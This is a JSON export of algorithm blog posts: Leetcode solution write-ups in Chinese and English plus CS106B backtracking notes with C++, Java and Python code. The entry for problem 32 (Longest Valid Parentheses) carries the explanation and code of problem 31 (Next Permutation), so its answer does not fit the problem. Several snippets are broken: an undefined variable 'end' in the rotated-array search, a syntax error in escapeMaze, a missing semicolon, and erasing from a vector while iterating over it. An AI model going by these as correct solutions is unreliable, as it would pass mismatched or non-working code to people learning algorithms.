Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"31. Next Permutation","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-31-Next-Permutation/","text":"题目[Medium] Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers. If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order). The replacement must be in-place, do not allocate extra memory. Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column. 1,2,3 → 1,3,23,2,1 → 1,2,31,1,5 → 1,5,1 中文题目实现下一个排列，将排列中的数字重新排列成字典序中的下一个更大的排列。 如果这样的重新排列是不可能的，它必须重新排列为可能的最低顺序（即升序排序）。 重排必须在原地，不分配额外的内存。 以下是一些示例，左侧是输入，右侧是输出： 1,2,3 → 1,3,23,2,1 → 1,2,31,1,5 → 1,5,1 思路做题目前，应该先理解排列permuation的概念，以及next permutation的含义。例如题目例子里的1，2，3的全排列，依次是： 1234561 2 31 3 22 1 32 3 13 1 23 2 1 next permuation的含义是从上面的第$i$行到第$i+1$行，如果是最后一行，则为第1行。 首先，应该了解到在前面变换数字，会导致排列增加很多，例如从1 2 3到 3 2 1。所以既然要找到比原来的数的排列大一点的数，自然是从后往前找。如果数组从尾到前是增加的，那么就表明，从尾到前增加的这几个数字已经是最大的排列了，不能增加了。所以，我们的目标是找到从尾到前是减小的数字。 假设数组从尾到前是增加的，然后在有一个地方出现了反转，例如数组：[1，5，8，4，7，6，5，3，1]在7和4的位置出现减小，我们需要做的就是找到该数字，将数字与最接近于并大于该数的数字交换(这里是5)。交换了以后，排列立刻增加了，但是后面的排列仍旧是非常大的。所以应该将之后的数组变成升序排列，也就是将后面的数的排列降到最低。可以分为下面三个步骤： 从尾到前，找到反转点 从尾部向前找到后半区比该值（1）大的数，交换两个数 将后面的数组变成升序排列 也就是说如果对于一个全排列$a_1,a_2,a_3,…,a_k$来说，如果满足$a_1 &lt; a_2 ≥ a_3 ≥ a_4 … ≥ a_k$（所有$a_1$开头的全排列中字典序最大的情况），就说明这个全排列的下一个全排列不能再由$a_1$开头，而是$a_1$在字典中的下一个元素$a_j$（即满足$a_j &gt; a_1$且$2 ≤ j ≤ k$的最小的$a_j$），由于任何$a_j$开头的全排列都大于$a_1$开头的全排列，所以我们寻找的全排列是$a_j$开头的最小的全排列。 1234567891011121314151617181920212223242526272829303132class Solution(object): def nextPermutation(self, nums): \"\"\" :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. \"\"\" n = len(nums) # 特殊情况，空的列表或只有一个元素 if n &lt; 2: return # 找到从尾到前开始减小的数的下标loc loc = None for i in reversed(range(1, n)): # 找到了 if nums[i-1] &lt; nums[i]: loc = i-1 break # 始终没有找到，即已经是最大排列，直接反转 if loc is None: nums.reverse() else: # 找到了该数字，将数字与最接近于并大于该数的数字交换 larger_than_loc = filter(lambda x: x &gt; nums[loc], nums[loc+1:]) number_index = nums[loc+1:].index(min(larger_than_loc)) + loc + 1 nums[number_index], nums[loc] = nums[loc], nums[number_index] # 将后面的元素变成升序序列 nums[loc+1:] = sorted(nums[loc+1:]) 参考 https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html https://www.tianmaying.com/tutorial/LC31 https://leetcode.com/problems/next-permutation/solution/","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"32. Longest Valid Parentheses","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-32-Longest-Valid-Parentheses/","text":"题目[Hard] Given a string containing just the characters &#39;(&#39; and &#39;)&#39;, find the length of the longest valid (well-formed) parentheses substring. For &quot;(()&quot;, the longest valid parentheses substring is &quot;()&quot;, which has length = 2. Another example is &quot;)()())&quot;, where the longest valid parentheses substring is &quot;()()&quot;, which has length = 4. 中文题目实现下一个排列，将排列中的数字重新排列成字典序中的下一个更大的排列。 如果这样的重新排列是不可能的，它必须重新排列为可能的最低顺序（即升序排序）。 重排必须在原地，不分配额外的内存。 以下是一些示例，左侧是输入，右侧是输出： 1,2,3 → 1,3,23,2,1 → 1,2,31,1,5 → 1,5,1 思路做题目前，应该先理解排列permuation的概念，以及next permutation的含义。例如题目例子里的1，2，3的全排列，依次是： 1234561 2 31 3 22 1 32 3 13 1 23 2 1 next permuation的含义是从上面的第$i$行到第$i+1$行，如果是最后一行，则为第1行。 首先，应该了解到在前面变换数字，会导致排列增加很多，例如从1 2 3到 3 2 1。所以既然要找到比原来的数的排列大一点的数，自然是从后往前找。如果数组从尾到前是增加的，那么就表明，从尾到前增加的这几个数字已经是最大的排列了，不能增加了。所以，我们的目标是找到从尾到前是减小的数字。 假设数组从尾到前是增加的，然后在有一个地方出现了反转，例如数组：[1，5，8，4，7，6，5，3，1]在7和4的位置出现减小，我们需要做的就是找到该数字，将数字与最接近于并大于该数的数字交换(这里是5)。交换了以后，排列立刻增加了，但是后面的排列仍旧是非常大的。所以应该将之后的数组变成升序排列，也就是将后面的数的排列降到最低。可以分为下面三个步骤： 从尾到前，找到反转点 从尾部向前找到后半区比该值（1）大的数，交换两个数 将后面的数组变成升序排列 也就是说如果对于一个全排列$a_1,a_2,a_3,…,a_k$来说，如果满足$a_1 &lt; a_2 ≥ a_3 ≥ a_4 … ≥ a_k$（所有$a_1$开头的全排列中字典序最大的情况），就说明这个全排列的下一个全排列不能再由$a_1$开头，而是$a_1$在字典中的下一个元素$a_j$（即满足$a_j &gt; a_1$且$2 ≤ j ≤ k$的最小的$a_j$），由于任何$a_j$开头的全排列都大于$a_1$开头的全排列，所以我们寻找的全排列是$a_j$开头的最小的全排列。 1234567891011121314151617181920212223242526272829303132class Solution(object): def nextPermutation(self, nums): \"\"\" :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. \"\"\" n = len(nums) # 特殊情况，空的列表或只有一个元素 if n &lt; 2: return # 找到从尾到前开始减小的数的下标loc loc = None for i in reversed(range(1, n)): # 找到了 if nums[i-1] &lt; nums[i]: loc = i-1 break # 始终没有找到，即已经是最大排列，直接反转 if loc is None: nums.reverse() else: # 找到了该数字，将数字与最接近于并大于该数的数字交换 larger_than_loc = filter(lambda x: x &gt; nums[loc], nums[loc+1:]) number_index = nums[loc+1:].index(min(larger_than_loc)) + loc + 1 nums[number_index], nums[loc] = nums[loc], nums[number_index] # 将后面的元素变成升序序列 nums[loc+1:] = sorted(nums[loc+1:]) 参考 https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html https://www.tianmaying.com/tutorial/LC31 https://leetcode.com/problems/next-permutation/solution/","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"310. Minimum Height Trees","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-310-Minimum-Height-Trees/","text":"For an undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels. Format The graph contains $n$ nodes which are labeled from 0 to $n - 1$. You will be given the number $n$ and a list of undirected edges (each edge is a pair of labels). You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. Example 1 : 123456789Input: n = 4, edges = [[1, 0], [1, 2], [1, 3]] 0 | 1 / \\ 2 3 Output: [1] Example 2 : 1234567891011Input: n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]] 0 1 2 \\ | / 3 | 4 | 5 Output: [3, 4] Note: According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.” The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf. Java这道题目有两类解法。第一种方法是，观察得到以树中的最长路径的中点为根构建的树的高度是最小的。那么问题就变成如何寻找树中的最长路径(longest path of a tree)。其中一种简便的方法就是，使用两次bfs，第一次bfs以任意点出发$p_0$，寻找到最远的点$v$，第二次bfs以寻找到的最远点$v$出发，寻找到距离该点距离最远的点$w$。路径$v-w$就是树中的最长路径。可以简单证明如下：第一次bfs寻找到的点一定为最长路径的一个端点，利用反证法，如果存在另一点$p$为第一次bfs的最远点，那么$|p-p_0| &gt; |v-w|$，显然与最长路径定义矛盾。既然第一次bfs寻找到了最长路径一个端点，第二次bfs就肯定是另一个端点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657private int[] bfs(Map&lt;Integer, List&lt;Integer&gt;&gt; graph, int[] edgeTo, int s) &#123; int[] distTo = new int[edgeTo.length]; boolean[] mark = new boolean[edgeTo.length]; Queue&lt;Integer&gt; q = new ArrayDeque&lt;&gt;(); q.offer(s); mark[s] = true; distTo[s] = 0; while (!q.isEmpty()) &#123; int v = q.poll(); for (int w : graph.get(v)) &#123; if (!mark[w]) &#123; mark[w] = true; distTo[w] = distTo[v] + 1; edgeTo[w] = v; q.offer(w); &#125; &#125; &#125; int longestPath = 0, longestDist = -1; for (int i = 0; i &lt; distTo.length; i++) &#123; if (distTo[i] &gt; longestDist) &#123; longestDist = distTo[i]; longestPath = i; &#125; &#125; return new int[]&#123;longestDist, longestPath&#125;;&#125;public List&lt;Integer&gt; findMinHeightTrees(int N, int[][] edges) &#123; // construct graph Map&lt;Integer, List&lt;Integer&gt;&gt; graph = new HashMap&lt;&gt;(); for (int i = 0; i &lt; N; i++) graph.put(i, new ArrayList&lt;&gt;()); for (int i = 0; i &lt; edges.length; i++) &#123; int v = edges[i][0], w = edges[i][1]; graph.get(v).add(w); // v-&gt;w graph.get(w).add(v); // w-&gt;v &#125; // two bfs to find longest path v-w int[] edgeTo = new int[N]; int v = bfs(graph, edgeTo, 0)[1]; int tmp[] = bfs(graph, edgeTo, v); int w = tmp[1], longestDist = tmp[0]; // find roots (mid-points) of longest path v-w List&lt;Integer&gt; roots = new ArrayList&lt;&gt;(); int mid = w; for (int i = 0; i &lt; longestDist / 2; i++) mid = edgeTo[mid]; roots.add(mid); if (longestDist % 2 == 1) // two middle points roots.add(edgeTo[mid]); return roots;&#125; 而第二种方法非常巧妙了，改自BFS拓扑排序。非常类似“剥洋葱”法BFS：从叶子节点剥向根节点。可以这么设想：最简单的图是什么？ a path graph，连成一条直线的图，那么怎么寻找该图的根节点？使用两个指针，一个指向尾部end, 一个指向首部front, 然后依次向中间移动。对于一个任意无向图，这样的path graph有很多，那么指针的前后向中间移动，可以抽象成一个外面的面向中间收缩，也就是剥洋葱了。 1234567891011121314151617181920212223242526272829303132333435363738394041public List&lt;Integer&gt; findMinHeightTrees(int n, int[][] edges) &#123; List&lt;List&lt;Integer&gt;&gt; graph = new ArrayList&lt;List&lt;Integer&gt;&gt;(); List&lt;Integer&gt; roots = new ArrayList&lt;Integer&gt;(); // special case: one vertex if (n == 1) &#123; roots.add(0); return roots; &#125; // degree of every vertex int[] degree = new int[n]; for(int i = 0; i&lt; n; i++) graph.add(new ArrayList&lt;Integer&gt;()); // initialize degree and graph for(int i=0; i&lt;edges.length; i++) &#123; int v = edges[i][0], w = edges[i][1]; graph.get(v).add(w); graph.get(w).add(v); degree[v]++; degree[w]++; &#125; // add leaves Queue&lt;Integer&gt; leaves = new ArrayDeque&lt;Integer&gt;(); for(int i = 0; i&lt; n; i++) if (degree[i] == 1) leaves.offer(i); while (!leaves.isEmpty()) &#123; //剥一层叶子 roots = new ArrayList&lt;Integer&gt;(); // 根就是最后一层叶子 int leave_size = leaves.size(); // 这层叶子大小，把这层叶子剥掉 for(int i = 0; i &lt; leave_size; i++)&#123; int leaf = leaves.poll(); roots.add(leaf); // 加入叶子 degree[leaf]--; // 叶子的度减去1 for (int next : graph.get(leaf)) &#123; // 遍历连接叶子的节点 if (degree[next] == 0) continue; // 原本就是叶子，i.e.外层 if (degree[next] == 2) leaves.offer(next); // 把这个节点变成叶子 degree[next]--; &#125; &#125; &#125; return roots;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Exhaustive Search and Backtracking","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Algorithm-Backtracking/","text":"来自Stanford CS106B Lecture 9/10/11 - Exhaustive Search and Backtracking (winter 2018)的学习笔记。 视频地址 1. Exhaustive searchexhaustive search(穷举搜索): Exploring every possible combination from a set of choices or values. often implemented recursively Applications producing all permutations of a set of values enumerating all possible names, passwords, etc. combinatorics and logic programming. Often the search space consists of many decisions, each has several available choices. Example: When enumerating all 5-letter strings, each of the 5 letters is a decision, and each of those decisions has 26 possible choice. A general pseudo-code algorithm for exhaustive search: Example - printAllBinaryWrite a recursive function printAllBinary that accepts an integer number of digits and prints all binary numbers that have exactly that many digits, in ascending order, one per line. 打印出所有n位二进制数字。使用递归法，注意basecase。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;void printAllBinaryHelper(int digits, string s)&#123; if (digits == 0) &#123; // base case: print the string we have buitl cout &lt;&lt; s &lt;&lt; endl; &#125; else&#123; printAllBinaryHelper(digits -1, s+\"0\"); printAllBinaryHelper(digits -1, s+\"1\"); &#125;&#125;void printAllBinary(int digits)&#123; printAllBinaryHelper(digits, \"\");&#125;int main()&#123; int digits = 3; printAllBinary(digits);&#125; 类似的，对于10进制数字，有 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;void printDecimalHelper(int digits, string s)&#123; if (digits == 0)&#123; // base case cout &lt;&lt; s &lt;&lt; endl; &#125; else&#123; for (int i = 0; i&lt; 10; i++)&#123; printDecimalHelper(digits-1, s+to_string(i)); &#125;; &#125;&#125;void printDecimal(int digits)&#123; printDecimalHelper(digits, \"\");&#125;int main()&#123; printDecimal(2);&#125; 2. Backtrackingbacktracking: Finding solution(s) by trying partial solutions and then abandoning them if they are not suitable. a “brute force” algorithmic technique (tries all paths) often implemented recursively Applications: producing all permutations of a set of values parsing languages games: anagrams, crosswords, word jumbles combinatorics and logic programming escaping from a maze A general pseudo-code algorithm for backtracking Key tasks: Figure out appropriate smallest unit of work (decision) Figure out how to enumerate all possible choices/options for it. Example- Dice Roll SumDice Roll Sum: Write a function diceSum that accepts two integer parameters: a number of dice to roll, and a desired sum of all die values. Output all combinations of die values that add up to exactly that sum. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;/* * prints all possible outcomes of rolling the given * number of six-sided dice that add up to exactly the given * desired sum, in &#123;#, #, #&#125; format. */using namespace std;void diceSumHelper(int dice, int desiredSum, vector&lt;int&gt; &amp; chosen)&#123; /*cout &lt;&lt; resursionIndent() &lt;&lt; \"diceSum(\" &lt;&lt; dice &lt;&lt; \", \" &lt;&lt; desiredSum &lt;&lt; \", \" &lt;&lt; chosen &lt;&lt; \")\" &lt;&lt; endl; */ if (dice == 0 )&#123; if (desiredSum==0) &#123; // base case cout &lt;&lt; \"&#123;\"; for (int i=0; i&lt; chosen.size()-1; i++)&#123; cout &lt;&lt; chosen[i] &lt;&lt; \",\"; &#125; cout &lt;&lt; chosen[chosen.size()-1] &lt;&lt; \"&#125;\" &lt;&lt; endl; &#125; &#125; else&#123; for (int i= 1; i&lt; 7; i++)&#123; // choose i chosen.push_back(i); // explore what could follow that diceSumHelper(dice-1, desiredSum-i, chosen); // un-choose i chosen.pop_back(); &#125; &#125;&#125;void diceSum(int dice, int desiredSum)&#123; vector&lt;int&gt; v; diceSumHelper(dice, desiredSum, v);&#125;int main()&#123; cout &lt;&lt; \"diceSum:\" &lt;&lt; endl; diceSum(3, 7); return 0;&#125; 但这并不是非常好的一个解决方案。It checks every possibility. 所以可以加上一些限制条件。 123else if (desiredSum &gt;= dice*1 &amp;&amp; desiredSum &lt;= dice*6)&#123; ...todo something&#125; Example - Escape MazeWrite a function escapeMaze(maze, row, col) that searches for a path out of a given 2-dimensional maze. Return true if able to escape, or false if not. “Escaping” means exiting the maze boundaries. You can move 1 square at a time in any of the 4 directions “Mark” your path along the way. “Taint” bad paths that do not work. Do not explore the same path twice. 12345678910111213141516171819202122232425bool escapeMaze(Maze&amp; maze, int row, int col) &#123; //base case if(!maze.inBounds(row, col))&#123; return true; &#125; else if(maze.isWall(row, col))&#123; return false; &#125; else if (maze.isOpen(row, col))&#123; //choose maze.mark(row, col); bool result = escapeMaze(maze, row + 1, col) || escapeMaze(maze, row, col + 1) || escapeMaze(maze, row, col - 1) || escapeMaze(maze, row - 1, col))&#123; &#125; //un-choose if (!result)&#123; maze.taint(row, col); &#125; return result; &#125; else &#123; return false; &#125;&#125; Example - Permute VectorWrite a function permute that accepts a Vector of strings as a parameter and outputs all possible rearrangements of the strings in that vector. The arrangements may be output in any order. Example: if v contains { “a”, “b”, “c”, “d”}, you function outputs these permutations: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;// &#123;a, b, c, d&#125;void permuateHelper(vector&lt;string&gt; &amp;v, vector&lt;string&gt;&amp; chosen)&#123; // base_case if (v.size()==0) &#123; cout &lt;&lt; \"&#123; \"; for (vector&lt;string&gt;::iterator iter=chosen.begin(); iter!=chosen.end();iter++)&#123; cout &lt;&lt; *iter; &#125; cout &lt;&lt; \" &#125;\" &lt;&lt; endl; &#125; // for each choice: for (vector&lt;string&gt;::iterator iter=v.begin(); iter!=v.end(); iter++)&#123; //-choose string s = *iter; chosen.push_back(*iter); v.erase(iter); //-explore permuateHelper(v, chosen); //-unchoose chosen.pop_back(); v.insert(iter, s); &#125; &#125;void permuate(vector&lt;string&gt; &amp;v)&#123; vector&lt;string&gt; chosen; permuateHelper(v, chosen);&#125;int main()&#123; string str[] = &#123;\"M\", \"A\", \"R\", \"T\", \"Y\"&#125;; vector&lt;string&gt; v(str, str+5); permuate(v);&#125; Example: SublistsWrite a function sublists that finds every possible sub-list of a given vector. A sub-list of a vector V contains $\\ge 0$ of $V\\prime$ elements. Example: if V is {Jane, Bob, Matt, Sara}, then the call of sublists(V); prints: You can print the sub-lists out in any order, one per line. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;//&#123;\"Jane\",\"Bob\", \"Matt\", \"Sara\"&#125;void sublistsHelper(vector&lt;string&gt;&amp; v, vector&lt;string&gt;&amp; chosen)&#123; if (v.size()==0)&#123; // base case cout &lt;&lt; \"&#123;\"; for (vector&lt;string&gt;::iterator iter= chosen.begin(); iter!= chosen.end(); iter++)&#123; cout &lt;&lt; *iter &lt;&lt; \" \"; &#125; cout &lt;&lt; \"&#125;\" &lt;&lt; endl; &#125;else&#123; // recursive case // for each possible choice: string s = v[0]; v.erase(v.begin()); // - choose/explore (without s) sublistsHelper(v, chosen); // - choose/explore (with s) chosen.push_back(s); sublistsHelper(v, chosen); // - unchoose v.insert(v.begin(), s); chosen.pop_back(); &#125;&#125;/* * Prints all subsets of the given vector */void sublists(vector&lt;string&gt; &amp;v)&#123; vector&lt;string&gt; chosen; sublistsHelper(v, chosen);&#125;int main()&#123; string _names[]= &#123;\"Jane\",\"Bob\", \"Matt\", \"Sara\"&#125;; vector&lt;string&gt; names(_names, _names+4); cout &lt;&lt; \"sublists of \"; for ( vector&lt;string&gt;::iterator iter= names.begin(); iter!= names.end(); iter++)&#123; cout &lt;&lt; *iter &lt;&lt; \" \"; &#125; cout &lt;&lt; \":\" &lt;&lt; endl &lt;&lt; endl; sublists(names); return 0;&#125; Example: 8 QueensThe 8 Queens problem: Consider the problem of trying to place 8 queens on a chess board such that no queen can attack another queen. 经典的八皇后问题：在8×8格的国际象棋上摆放八个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。 讲解视频 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;bool solveQueensHelper(Board &amp;board, int column)&#123; if (column &gt;= 8)&#123; // check valid cout &lt;&lt; board.toString() &lt;&lt; endl; return true; &#125; else &#123; for (int row=0; row&lt;8; row ++)&#123; if (board.isSafe(row, column))&#123; //choose board.place(row, column); //explore bool finished = solveQueensHelper(board, column+1); if (finished) &#123; return true; &#125; //unchoose board.remove(row, column); &#125; &#125; return false &#125;&#125;void solveQueens(Board &amp; board)&#123; solveQueensHelper(board, 0);&#125;","tags":[{"name":"Recursion","slug":"Recursion","permalink":"http://larryim.cc/tags/Recursion/"},{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"}],"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://larryim.cc/categories/Algorithm/"}]},{"title":"328. Odd Even Linked List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-328-Odd-Even-Linked-List/","text":"Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes. You should try to do it in place. The program should run in $O(1)$ space complexity and $O(\\text{nodes})$ time complexity. Example 1: 12Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULLOutput: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL Example 2: 12Input: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULLOutput: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL Note: The relative order inside both the even and odd groups should remain as it was in the input. The first node is considered odd, the second node even and so on … Java最直接的办法：一个odd链表保存奇数节点，一个even链表保存偶数节点。最后将odd链表的尾部只想even链表的首部，并将even链表的尾部指向null。 123456789101112131415161718192021222324252627public ListNode oddEvenList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode odd = head, even = head.next, cur = even.next; ListNode evenHead = even; // 一个odd链表保存奇数节点，一个even链表保存偶数节点 while (cur != null &amp;&amp; cur.next != null) &#123; odd.next = cur; even.next = cur.next; // move to next odd = odd.next; even = even.next; cur = cur.next.next; &#125; // odd链表的尾部只想even链表的首部，并将even链表的尾部指向null。 if (cur == null) &#123; odd.next = evenHead; even.next = null; &#125; else &#123; //还有一个odd节点 odd.next = cur; odd.next.next = evenHead; even.next = null; &#125; return head;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"331. Verify Preorder Serialization of a Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-331-Verity-Preorder-Serialization-of-a-Binary-Tree/","text":"One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node’s value. If it is a null node, we record using a sentinel value such as #. 1234567 _9_ / \\ 3 2 / \\ / \\ 4 1 # 6/ \\ / \\ / \\# # # # # # For example, the above binary tree can be serialized to the string &quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;, where # represents a null node. Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree. Each comma separated value in the string must be either an integer or a character&#39;#&#39; representing null pointer. You may assume that the input format is always valid, for example it could never contain two consecutive commas such as &quot;1,,3&quot;. Example 1: 12Input: &quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;Output: true Example 2: 12Input: &quot;1,#&quot;Output: false Example 3: 12Input: &quot;9,#,#,1&quot;Output: false Solution 1Some used stack. Some used the depth of a stack. Here I use a different perspective. In a binary tree, if we consider null as leaves, then all non-null node provides 2 outdegree and 1 indegree (2 children and 1 parent), except root all null node provides 0 outdegree and 1 indegree (0 child and 1 parent). Suppose we try to build this tree. During building, we record the difference between out degree and in degree diff = outdegree - indegree. When the next node comes, we then decrease diff by 1, because the node provides an in degree. If the node is not null, we increase diff by 2, because it provides two out degrees. If a serialization is correct, diff should never be negative and diff will be zero when finished. 为什么开始为1呢？其实可以这么理解，在根结点上加一个虚拟的根节点。 123456789public boolean isValidSerialization(String preorder) &#123; String[] nodes = preorder.split(\",\"); int diff = 1; for (String node: nodes) &#123; if (--diff &lt; 0) return false; if (!node.equals(\"#\")) diff += 2; &#125; return diff == 0;&#125; Solution212345678910111213141516171819202122232425 public boolean isValidSerialization(String preorder) &#123; // using a stack, scan left to right // case 1: we see a number, just push it to the stack // case 2: we see #, check if the top of stack is also # // if so, pop #, pop the number in a while loop, until top of stack is not # // if not, push it to stack // in the end, check if stack size is 1, and stack top is # if (preorder == null) &#123; return false; &#125; Stack&lt;String&gt; st = new Stack&lt;&gt;(); String[] strs = preorder.split(\",\"); for (int pos = 0; pos &lt; strs.length; pos++) &#123; String curr = strs[pos]; while (curr.equals(\"#\") &amp;&amp; !st.isEmpty() &amp;&amp; st.peek().equals(curr)) &#123; st.pop(); if (st.isEmpty()) &#123; return false; &#125; st.pop(); &#125; st.push(curr); &#125; return st.size() == 1 &amp;&amp; st.peek().equals(\"#\");&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"33. Search in Rotated Sorted Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-33-Search-in-Rotated-Sorted-Array/","text":"Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]). You are given a target value to search. If found in the array return its index, otherwise return -1. You may assume no duplicate exists in the array. Your algorithm’s runtime complexity must be in the order of $O(\\log n)$. Example 1: 12Input: nums = [4,5,6,7,0,1,2], target = 0Output: 4 Example 2: 12Input: nums = [4,5,6,7,0,1,2], target = 3Output: -1 Java这道题是二分查找Search Insert Position的变体，看似有点麻烦，其实理清一下还是比较简单的。因为rotate的缘故，当我们切取一半的时候可能会出现误区，所以我们要做进一步的判断。具体来说，假设数组是A，每次左边缘为$lo$，右边缘为$hi$，还有中间位置是$mid$。在每次迭代中，分三种情况： 如果target==A[mid]，那么m就是我们要的结果，直接返回； 如果A[mid]&lt;A[hi]，那么说明从$mid$到$hi$一定是有序的（没有受到rotate的影响），那么我们只需要判断target是不是在$mid$到$hi$之间，如果是则把左边缘移到$mid+1$，否则就target在另一半，即把右边缘移到$mid-1$。（3）如果A[mid]&gt;=A[hi]，那么说明从$lo$到$mid$一定是有序的，同样只需要判断target是否在这个范围内，相应的移动边缘即可。 根据以上方法，每次我们都可以切掉一半的数据，所以算法的时间复杂度是$O(\\log n)$，空间复杂度是$O(1)$。 递归版本： 1234567891011121314151617public int search(int[] nums, int target) &#123; if (nums == null || nums.length == 0) return -1; return search(nums, 0, nums.length - 1, target);&#125; private int search(int[] nums, int lo, int hi, int target) &#123; int mid = (lo + hi) / 2, midVal = nums[mid]; if (midVal == target) return mid; if (lo &gt;= hi) return -1; if (midVal &gt;= nums[lo]) &#123; if (midVal &gt; target &amp;&amp; target &gt;= nums[lo]) return search(nums, lo, mid - 1, target); else return search(nums, mid + 1, end, target); &#125; else &#123; if (midVal &lt; target &amp;&amp; target &lt;= nums[hi]) return search(nums, mid + 1, hi, target); else return search(nums, lo, mid - 1, target); &#125;&#125; 迭代版本： 1234567891011121314151617public int search(int[] nums, int target) &#123; if (nums == null || nums.length == 0) return -1; int lo = 0, hi = nums.length - 1, mid, midVal; while (lo &lt;= hi) &#123; mid = (lo + hi) / 2; midVal = nums[mid]; if (midVal == target) return mid; if (midVal &gt;= nums[lo]) &#123; if (midVal &gt; target &amp;&amp; target &gt;= nums[lo]) hi = mid - 1; else lo = mid + 1; &#125; else &#123; if (midVal &lt; target &amp;&amp; target &lt;= nums[hi]) lo = mid + 1; else hi = mid - 1; &#125; &#125; return -1;&#125; Python123456789101112131415161718192021222324252627282930313233def search(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: int \"\"\" left = 0 right = len(nums) - 1 found = False while left &lt;= right and not found: mid = (left + right ) // 2 print left, right, mid if nums[mid] == target: found = True return mid elif nums[left] &lt;= nums[mid]: if target &gt;= nums[left] and target &lt; nums[mid]: right = mid - 1 else: left = mid + 1 else: if target &gt;= nums[mid] and target &lt;= nums[right]: left = mid + 1 else: right = mid - 1 return -1","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary 